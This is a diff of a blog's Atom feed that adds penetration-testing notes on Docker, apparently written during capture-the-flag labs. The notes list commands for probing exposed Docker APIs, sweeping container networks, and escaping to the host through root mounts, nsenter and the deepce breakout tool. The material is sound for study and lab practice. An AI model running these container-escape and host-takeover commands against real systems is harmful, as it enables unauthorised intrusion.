@@ -4,13 +4,181 @@
  <title>Spindel</title>
  <link href="https://mvineza.github.io/spindel/atom.xml" rel="self"/>
  <link href="https://mvineza.github.io/spindel/"/>
- <updated>2022-03-15T23:57:47+08:00</updated>
+ <updated>2022-03-17T18:31:31+08:00</updated>
  <id>https://mvineza.github.io</id>
  <author>
    <name>spindel</name>
    <email>rell.vineza14@yahoo.com</email>
  </author>
 
+ 
+ <entry>
+   <title>Docker</title>
+   <link href="https://mvineza.github.io/spindel/2022/03/17/docker"/>
+   <updated>2022-03-17T00:00:00+08:00</updated>
+   <id>https://mvineza.github.io/2022/03/17/Docker</id>
+   <content type="html">&lt;h2 id=&quot;overview&quot;&gt;Overview&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Running container with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--privileged&lt;/code&gt; gives all capabilities to containers compared to just using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--cap-add SYS_ADMIN&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;detection&quot;&gt;Detection&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;A host may be running docker if it exposes different version of app from network scan. Example is from HTB Enterprise, there are multiple apache versions which is odd. I was found out that its running 2 docker containers, 1 for wordpress and 1 for joomla.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;ports&quot;&gt;Ports&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;2375/tcp&lt;/li&gt;
+  &lt;li&gt;2376/tcp&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;network&quot;&gt;Network&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Example container IP is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;172.17.0.2&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;docker-api-commands&quot;&gt;Docker API Commands&lt;/h2&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# gets docker version&lt;/span&gt;
+curl http://10.10.198.13:2375/version
+
+&lt;span class=&quot;c&quot;&gt;# getting list of images via exposed docker tcp socket&lt;/span&gt;
+docker &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; tcp://10.10.198.13:2375 ps
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;container-commands&quot;&gt;Container Commands&lt;/h2&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# are we inside a container?&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; /.dockerenv
+&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /proc/1/cgroup | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;docker
+
+&lt;span class=&quot;c&quot;&gt;# check if privileged - you must see host devices&lt;/span&gt;
+fdisk &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# check if privileged (looks like these should be seen&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# under `Current:` and not on the bounding set)&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# - if Capeff is set to all 0's, the container most likely&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#   doesn't have much permissions, meaning you can't breakout!&lt;/span&gt;
+capsh &lt;span class=&quot;nt&quot;&gt;--print&lt;/span&gt; | egrep &lt;span class=&quot;s1&quot;&gt;'cap_(net_admin|sys_module|sys_chroot|sys_admin|sys_time)'&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# Use this if `capsh` is not available&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# - on attacker machine, get one output and decode it:&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#     capsh --decode=&amp;lt;NUMBERS&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#     NOTE: Look at CapPrm and CapEff output&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /proc/&lt;span class=&quot;nv&quot;&gt;$$&lt;/span&gt;/status | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; ^Cap
+
+&lt;span class=&quot;c&quot;&gt;# Extracting network information&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /proc/net/tcp
+&lt;span class=&quot;nb&quot;&gt;hostname&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-I&lt;/span&gt;
+ifconfig
+ip a
+
+&lt;span class=&quot;c&quot;&gt;# Check the available IPs via arp. For example, you can find&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# IP addresses of databases using these methods below.&lt;/span&gt;
+ip neighbor
+arp &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/hosts
+
+&lt;span class=&quot;c&quot;&gt;# Check subnets&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /proc/net/fib_trie | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-B1&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;32 host LOCAL&quot;&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# You can also do ping sweep to see reachable IPs.&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;i &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;1..254&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 172.17.0.&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;bytes from&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Unreachable&quot;&lt;/span&gt; &amp;amp;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;i &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;1..65535&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 172.20.0.&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt; &amp;amp;&amp;gt; /dev/null &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;: UP&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# check if can control docker socket&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; /var/run/docker.sock
+
+&lt;span class=&quot;c&quot;&gt;# check if you can write to the filesystem&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;1 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /proc/sysrq-trigger
+
+&lt;span class=&quot;c&quot;&gt;# try to mount host root volume&lt;/span&gt;
+docker run &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; /:/mnt &lt;span class=&quot;nt&quot;&gt;--rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-it&lt;/span&gt; alpine &lt;span class=&quot;nb&quot;&gt;chroot&lt;/span&gt; /mnt sh
+
+&lt;span class=&quot;c&quot;&gt;# docker running with --pid=host command? processes&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# must be similar to host processes&lt;/span&gt;
+ps &lt;span class=&quot;nt&quot;&gt;-ef&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# use a statically compiled nmap and upload&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# /usr/share/nmap inside the container&lt;/span&gt;
+./nmap &lt;span class=&quot;nt&quot;&gt;--datadir&lt;/span&gt; usr/share/nmap &lt;span class=&quot;nt&quot;&gt;-sT&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p1-65535&lt;/span&gt; 172.20.0.1-10
+
+&lt;span class=&quot;c&quot;&gt;# enter root namespace and drop to host shell&lt;/span&gt;
+nsenter &lt;span class=&quot;nt&quot;&gt;--target&lt;/span&gt; 1 &lt;span class=&quot;nt&quot;&gt;--mount&lt;/span&gt; sh
+
+&lt;span class=&quot;c&quot;&gt;# create a new namespace mapping root user&lt;/span&gt;
+unshare &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# see if you can migrate to another namespace (root namespace?)&lt;/span&gt;
+nsenter &lt;span class=&quot;nt&quot;&gt;--target&lt;/span&gt; 1 &lt;span class=&quot;nt&quot;&gt;--all&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# check hardcoded IPs and hostnames&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/hosts
+
+&lt;span class=&quot;c&quot;&gt;# check what devices are available and mounted&lt;/span&gt;
+mount
+&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /proc/mounts
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;automated-tools&quot;&gt;Automated tools&lt;/h2&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# https://github.com/cdk-team/CDK#installationdelivery&lt;/span&gt;
+cdk evaluate &lt;span class=&quot;nt&quot;&gt;--full&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# https://github.com/PercussiveElbow/docker-escape-tool&lt;/span&gt;
+./docker_escape check
+
+&lt;span class=&quot;c&quot;&gt;# https://github.com/stealthcopter/deepce&lt;/span&gt;
+./deepce.sh
+./deepce.sh &lt;span class=&quot;nt&quot;&gt;--no-enumeration&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--exploit&lt;/span&gt; PRIVILEGED &lt;span class=&quot;nt&quot;&gt;--username&lt;/span&gt;
+./deepce.sh &lt;span class=&quot;nt&quot;&gt;--password&lt;/span&gt; deepce
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;docker-registries&quot;&gt;Docker Registries&lt;/h2&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# gets images&lt;/span&gt;
+curl http://docker-rodeo.thm:5000/v2/_catalog
+
+&lt;span class=&quot;c&quot;&gt;# gets image tags&lt;/span&gt;
+url http://docker-rodeo.thm:5000/v2/cmnatic/myapp1/tags/list
+
+&lt;span class=&quot;c&quot;&gt;# inspect image manifest file&lt;/span&gt;
+curl http://docker-rodeo.thm:5000/v2/cmnatic/myapp1/manifests/latest | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; /root/root.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;docker-parameters&quot;&gt;Docker parameters&lt;/h2&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# gives full privileges on the host system&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;--privileged&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# removes any security restrictions for the container&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;--security-opt&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;seccomp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;undefined
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;tools&quot;&gt;Tools&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/stealthcopter/deepce&quot;&gt;deepce&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/wagoodman/dive&quot;&gt;dive&lt;/a&gt; - reverse engineers docker images&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout&quot;&gt;Docker Breakout - HackTricks&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://book.hacktricks.xyz/pentesting/2375-pentesting-docker&quot;&gt;2375, 2376 Pentesting Docker - HackTricks&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://owasp.org/www-chapter-sydney/files/docker-containers.pdf&quot;&gt;Hacking Dockers and Containers (OWASP)&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/sneakerhax/OffensiveDocker&quot;&gt;GitHub - sneakerhax/OffensiveDocker: Offensive security tools Dockerized&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://i.blackhat.com/us-18/Thu-August-9/us-18-McGrew-An-Attacker-Looks-At-Docker-Approaching-Multi-Container-Applications-wp.pdf&quot;&gt;An Attacker Looks at Docker (BlackHat)&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;
+    &lt;table&gt;
+      &lt;tbody&gt;
+        &lt;tr&gt;
+          &lt;td&gt;[Lesson 4: Hacking Containers Like A Boss&lt;/td&gt;
+          &lt;td&gt;Practical DevSecOps](https://www.practical-devsecops.com/lesson-4-hacking-containers-like-a-boss/)&lt;/td&gt;
+        &lt;/tr&gt;
+      &lt;/tbody&gt;
+    &lt;/table&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.kernel.org/doc/Documentation/cgroup-v1/cgroups.txt&quot;&gt;Cgroups&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;https://research.nccgroup.com/wp-content/uploads/2020/07/ncc_group_understanding_hardening_linux_containers-1-1.pdf&lt;/li&gt;
+&lt;/ul&gt;
+</content>
+ </entry>
  
  <entry>
    <title>Kibana LFI to RCE</title>
